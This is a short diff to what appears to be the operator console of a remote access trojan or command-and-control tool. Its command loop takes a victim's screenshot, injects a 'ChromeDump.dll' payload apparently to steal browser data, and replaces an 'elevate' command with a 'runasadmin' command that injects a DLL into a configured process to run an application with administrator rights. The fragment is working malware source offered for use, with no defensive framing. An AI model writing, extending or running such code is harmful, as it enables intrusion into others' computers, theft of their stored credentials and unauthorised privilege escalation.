@@ -715,10 +715,14 @@ Open Ports
                 elif(main == "screenshot"):
                     self.SendData("screenshot")
                     self.WaitForReply()
-                elif(main == "elevate"):
+                elif(main == "runasadmin"):
                     # print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
-                    DLLTransfer("payloads/elevate.dll", setting('inject_process')) # Inject elevate.dll 
-                
+                    app = prompt("[+] Application name : ")
+                    if(len(app) > 0):
+                        SendPayloadCommand(app)
+                        DLLTransfer("payloads/runasadmin.dll", setting('inject_process')) # Inject elevate.dll 
+                        RemovePayloadCommand()
+                        
                 elif(main == "chromedump"):
                     # print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                     DLLTransfer("payloads/ChromeDump.dll", setting('inject_process')) # Inject ChromeDump.dll
